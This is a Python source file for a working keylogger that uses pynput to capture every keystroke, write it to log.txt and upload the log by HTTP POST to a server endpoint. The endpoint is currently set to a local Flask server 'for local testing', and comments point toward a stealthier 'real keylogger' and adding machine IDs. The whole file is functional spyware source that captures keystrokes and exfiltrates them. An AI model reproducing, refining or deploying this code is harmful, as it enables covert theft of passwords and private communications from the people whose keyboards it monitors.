import requests # Import the requests library for making HTTP calls
from typing import List
from pynput.keyboard import Key, Listener
import os # Import os for checking file size and existence

# --- Configuration ---
# MODIFIED FOR LOCAL TESTING: Points to the local Flask server.
API_SERVER_URL = "http://127.0.0.1:5000/upload-keys"
LOG_FILE_NAME = "log.txt"
UPLOAD_THRESHOLD_BYTES = 100 # Lowered threshold for easier testing

# --- Global Variables ---
char_count = 0
saved_keys = []

def send_log_file():
    """
    Reads the content of the log file and sends it to the configured
    API server via an HTTP POST request.
    If the upload is successful, the log file is cleared to prevent
    redundant uploads.
    """
    # 1. Check if the file exists and has content
    if not os.path.exists(LOG_FILE_NAME):
        return

    # Check file size (optional, but good practice to avoid tiny uploads)
    if os.path.getsize(LOG_FILE_NAME) < UPLOAD_THRESHOLD_BYTES:
        return

    try:
        with open(LOG_FILE_NAME, "r") as file:
            log_data = file.read()

        # 2. Prepare the payload for the API
        payload = {
            "log_content": log_data
            # You might want to add a unique machine ID here as well
        }

        # 3. Send the data to the API server
        # Note: We send 'data=payload' because the keylogger is expecting a form-encoded payload, not JSON.
        response = requests.post(API_SERVER_URL, data=payload, timeout=10) # Set a 10s timeout

        if response.status_code == 200:
            # 4. Success: Clear the log file after a successful upload
            print(f"\n[INFO] Successfully uploaded {len(log_data)} bytes to API. Clearing log.")
            # Overwrite the file with an empty string to clear it
            with open(LOG_FILE_NAME, "w") as file:
                file.write("")
        else:
            print(f"\n[WARNING] Upload failed. API returned status code: {response.status_code}")
            print(f"Server response content: {response.text}")

    except requests.exceptions.RequestException as e:
        # Handle connection errors, timeouts, etc.
        print(f"\n[ERROR] Network or request error during upload: {e}")
    except Exception as ex:
        # Handle file read/write errors
        print(f"\n[ERROR] An unexpected error occurred: {ex}")


def on_key_press(key: str):
    """
    Callback function that gets executed when a key is pressed.
    """
    try:
        # Note: In a real keylogger, you would typically suppress this output.
        print("Key Pressed: ", key)
    except Exception as ex:
        print("There was an error: ", ex)

def on_key_release(key):
    """
    Callback function that gets executed when a key is released.
    Handles writing to a file and triggering the upload.
    """
    global saved_keys, char_count

    if key == Key.esc:
        # Attempt final upload before stopping
        write_to_file(saved_keys)
        send_log_file()
        return False
    else:
        # Use a flag to track if we need to clear the buffer
        should_clear_buffer = False

        if key == Key.enter:
            write_to_file(saved_keys)
            should_clear_buffer = True

        elif key == Key.space:
            key = " "
            write_to_file(saved_keys)
            should_clear_buffer = True

        # Append the key
        saved_keys.append(key)
        char_count += 1

        if should_clear_buffer:
            # Reset buffer only after writing to file
            char_count = 0
            saved_keys = []

            # --- NEW: Trigger API upload after keys are written to the file ---
            send_log_file()


def write_to_file(keys: List[str]):
    """
    Writes recorded keystrokes to a log file ('log.txt').
    """
    with open(LOG_FILE_NAME, "a") as file:
        for key in keys:
            key_str = str(key).replace("'", "")

            if "key".upper() not in key_str.upper():
                file.write(key_str)

        file.write(" ") # Write a space instead of a newline to keep log cleaner for API

# Start the keylogger using the Listener
if __name__ == "__main__":
    print("Start key logging...")
    # Attempt to send any remnant file data from a previous crash/run immediately
    send_log_file()

    # --- NEW: Use try...finally to ensure cleanup on forced exit (Ctrl+C) ---
    try:
        with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        # This block catches the Ctrl+C signal
        print("\n[INFO] Keyboard interrupt detected (Ctrl+C). Attempting final upload...")
    finally:
        # This runs regardless of how the listener stops (ESC or Ctrl+C)
        write_to_file(saved_keys) # Ensure any keys left in the buffer are saved
        send_log_file()           # Attempt the final upload
        print("End key logging...")

